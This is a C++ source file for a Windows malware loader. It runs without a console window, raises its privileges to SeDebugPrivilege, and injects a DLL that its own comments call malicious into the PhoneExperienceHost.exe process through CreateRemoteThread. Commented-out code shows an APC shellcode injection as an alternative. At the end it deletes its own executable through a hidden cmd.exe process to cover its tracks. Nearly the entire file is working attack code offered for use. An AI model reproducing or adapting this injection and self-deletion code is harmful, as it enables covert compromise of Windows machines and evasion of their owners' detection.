#include <strsafe.h>
#include "FreeResource.h"
#include "tools.h"


// Data section READABLE WRITABLE EXECUTABLE
// #pragma comment(linker, "/section:.data,RWE")
// No console windows
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")


void DeleteSelf();


int main(int argc, char* argv[]){
	free_resource();
	DWORD PID = GetProcessPid(L"PhoneExperienceHost.exe");


	// Imporve your privileges
	BOOL privilegesFlag = EnablePrivileges(GetCurrentProcess(), "SeDebugPrivilege");
	
	if (privilegesFlag) {
		std::cout << "privileges improve" << std::endl;
	}

	// LPVOID shellcode_Addr = shellcodeAddr(PID);
	// DLL INJECTION
	// BOOL INJECTION = InjectAPCbyPID(PID, shellcodeAddr);

	Sleep(10000);
	BOOL INJECTION = CreateRemoteThreadInjectDll(PID, "C:\\Users\\Administrator\\Downloads\\acvfunc.dll");
	// BOOL INJECTION = CreateRemoteThreadInjectDll(PID, "C:\\Users\\Public\\Document\\acvefunc.dll");
	
	if (INJECTION) {
		std::cout << "INJECTION SUCCESS" << std::endl;
	}
	
	DeleteSelf();
	return 0;
}


void DeleteSelf() {
	
	// Delete Module and malicious DLL
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[MAX_PATH];
	TCHAR Command[MAX_PATH] = TEXT("cmd.exe /C Del /f /q \"%s\"");
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	STARTUPINFO si1 = { 0 };
	PROCESS_INFORMATION pi1 = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, MAX_PATH, Command, szModuleName);

	// Create PROCESS
	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

}



